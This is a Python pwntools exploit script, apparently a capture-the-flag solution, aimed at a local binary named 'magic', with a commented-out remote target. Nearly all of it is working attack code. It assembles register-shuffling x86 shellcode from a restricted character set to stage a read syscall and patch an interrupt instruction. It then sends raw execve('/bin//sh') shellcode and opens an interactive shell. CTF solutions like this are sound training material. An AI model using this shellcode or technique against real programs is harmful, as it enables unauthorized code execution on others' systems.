from pwn import *

p = process('./magic')
#p = remote('magic.420blaze.in', 420)

asm_s = ""
asm_s += "dec esp;" * 4
asm_s += "pop ebx;" # ebx = 0
asm_s += "push ebx; pop eax;" # eax = 0
asm_s += "inc eax;" * 3 # eax = 3 for sys_read

asm_s += """
push esp;
inc esp;
pop ecx;
"""
asm_s += "push ecx; pop ebp;" # ebp = 0x61313375
# shift 0x61313375 -> 0x61313370
asm_s += "dec ecx;" * 5
# shift 0x61313375 -> 0x61313380
asm_s += "inc ebp;" * (0x80-0x75)
asm_s += """
push ecx;
dec esp;
"""
asm_s += "pop esp;"

# esp = 0x31337050

# 0x31337000:     0xbc    0x00    0x71    0x33    0x31    0x61    0x8b    0x25
# 0x31337008:     0x20    0x71    0x33    0x31    0x54    0x89    0x25    0x20
# 0x31337010:     0x71    0x33    0x31    0xbc    0x20    0x71    0x33    0x31
# 0x31337018:     0x60    0xe9    0x6d    0x16    0xd1    0xd6    0x00    0x00

# shift stack from 0x31337050 -> 0x31337024
asm_s += "push ebx;" * ((0x50-0x24) / 4)

asm_s += "push esp; pop ecx;" # ecx = 0x024
asm_s += "dec ecx;" * 4 # ecx = 0x020

asm_s += "push ebx;" # sp = 0x020
asm_s += "dec esp;" * 4 # 020 -> 01c
asm_s += "pop edi;" # eax = 0xd6d1
asm_s += "dec edi;" * (0xd1-0xcd) # eax=0xcd, esp=0x31337020
asm_s += "inc esp;" * 2 # esp=0x22
asm_s += "push edi;" # set *0x3133701e=0xcd
asm_s += "pop edi;"
asm_s += "inc esp;"
asm_s += "push ebp;"
asm_s += "dec esp;"

asm_s += "push ebx;" # overwrite jump target


stuff = asm(asm_s)

print(stuff)
print(len(stuff))

p.sendline(stuff)
sleep(1)
p.sendline("\x31\xc0\x50\x68\x2f\x2f\x73"
                           "\x68\x68\x2f\x62\x69\x6e\x89"
                                              "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                                                                 "\xcd\x80\x31\xc0\x40\xcd\x80")
p.interactive()
